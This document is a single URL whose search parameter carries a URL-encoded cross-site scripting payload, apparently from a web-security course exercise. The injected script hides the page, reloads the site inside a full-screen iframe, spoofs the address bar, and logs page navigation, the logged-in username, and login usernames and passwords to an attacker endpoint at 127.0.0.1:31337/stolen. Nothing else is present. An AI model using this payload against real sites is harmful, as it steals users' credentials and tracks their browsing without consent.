http://trurl.cs.illinois.edu/search?q=%3Cscript%3E%7B%24(%60%23query-lbl%60).text(%60%60)%7D%7Bpayload()%7Dfunction%20payload(attacker)%20%7B%7Bvar%20first_load%20%3D%200%7D%7Battacker%20%3D%20%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60%7Dfunction%20log(attacker%2C%20data)%20%7B%7Bconsole.log(%24.param(data))%7D%7B%24.get(attacker%2C%20data)%7D%7Dfunction%20changeAddressBar(url)%20%7Btry%20%7B%7Bwindow.history.replaceState(%7B%7D%2C%20%60%60%2C%20url)%7D%7D%20catch(e)%20%7B%7D%7Dfunction%20proxy(attacker%2C%20mainhref)%20%7B%7B%24(%60body%60).children().hide()%7D%7Bvar%20i%20%3D%20%24(%60%3Ciframe%20id%3D_track%3E%60).css(%7Bposition%3A%20%60absolute%60%2Cwidth%3A%20%60100%25%60%2Cheight%3A%20%60100%25%60%2Ctop%3A%200%2Cleft%3A%200%2Cborder%3A%200%2Cbackground%3A%20%60%23fff%60%7D).attr(%60sandbox%60%2C%20%60allow-same-origin%20allow-forms%20allow-scripts%60).attr(%60src%60%2C%60http%3A%2F%2Ftrurl.cs.illinois.edu%2F%60).appendTo(%60body%60).load(function()%20%7Bif(first_load%20%3D%3D%200)%20%7B%7BchangeAddressBar(%60http%3A%2F%2Ftrurl.cs.illinois.edu%2F%60)%7D%7Blog(attacker%2C%20%7Bevent%3A%20%60nav%60%2C%20user%3A%20%24(%60%23_track%60).contents().find(%60%23logged-in-user%60).text()%2Curi%3A%20mainhref%7D)%7D%7Bfirst_load%20%3D%20first_load%2B1%7D%7D%7B%24(%60%23_track%60).contents().find(%60.list-group%60).hide()%7D%7B%24(%60body%60%2Cthis.contentDocument).find(%60a%60).click(function()%20%7B%7Blog(attacker%2C%20%7Bevent%3A%60nav%60%2C%20user%3A%20%24(%60%23_track%60).contents().find(%60%23logged-in-user%60).text()%2Curi%3A%20this.href%7D)%7D%7BchangeAddressBar(this.href)%7D%7D).end().find(%60form%60).submit(function()%20%7Bif(%24(this).attr(%60action%60)%20%3D%3D%20%60.%2Flogin%60)%20%7B%7Bvar%20str%20%3D%20%24(this).serialize()%7D%7Bvar%20str_user%20%3D%20%60%60%7D%7Bvar%20eq_index%20%3D%20str.indexOf(%60%3D%60)%7D%7Bvar%20and_index%20%3D%20str.indexOf(%60%26%60)%7D%7Bstr_user%20%3D%20str.substring(eq_index%20%2B%201%2C%20and_index)%7D%7Bvar%20str_pass%20%3D%20%60%60%7D%7Bvar%20eq_index2%20%3D%20str.lastIndexOf(%60%3D%60)%7D%7Bstr_pass%20%3D%20str.substring(eq_index2%20%2B%201%2C%20str.length)%7D%7Blog(attacker%2C%20%7Bevent%3A%20%60login%60%2C%20user%3A%20str_user%2C%20pass%3A%20str_pass%7D)%7D%7Delse%20if(%24(this).attr(%60action%60)%20%3D%3D%20%60.%2Flogout%60)%7B%7Blog(attacker%2C%20%7Bevent%3A%20%60logout%60%2C%20user%3A%20%24(%60%23_track%60).contents().find(%60%23logged-in-user%60).text()%7D)%7D%7Delse%20%7B%7Bvar%20str_uri%20%3D%20%60http%3A%2F%2Ftrurl.cs.illinois.edu%2Fsearch%3F%60%20%2B%20%60q%3D%60%20%2B%20%24(%60%23_track%60).contents().find(%60%23query%60).val()%7D%7BchangeAddressBar(str_uri)%7D%7Blog(attacker%2C%20%7Bevent%3A%60nav%60%2C%20user%3A%20%24(%60%23_track%60).contents().find(%60%23logged-in-user%60).text()%2C%20uri%3A%20str_uri%20%7D)%7D%7D%7D).end()%7D%7D)%7D%7D%7Bproxy(attacker%2C%20%60http%3A%2F%2Ftrurl.cs.illinois.edu%2F%60)%7D%7D%3C%2Fscript%3E